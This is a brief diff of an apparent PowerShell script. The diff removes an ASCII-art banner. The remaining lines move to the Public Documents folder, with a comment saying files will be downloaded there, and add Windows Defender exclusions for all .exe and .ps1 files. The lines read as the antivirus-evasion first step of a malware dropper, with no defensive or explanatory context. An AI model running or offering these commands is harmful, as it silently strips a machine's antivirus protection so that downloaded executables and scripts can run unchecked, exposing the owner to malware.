@@ -1,9 +1,3 @@
-#                      _                        
-#  _   _  ___  _   _  | | ___ __   _____      __
-# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
-# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
-#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
-#  |___/                                        
 Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 Add-MpPreference -ExclusionExtension ps1 -Force
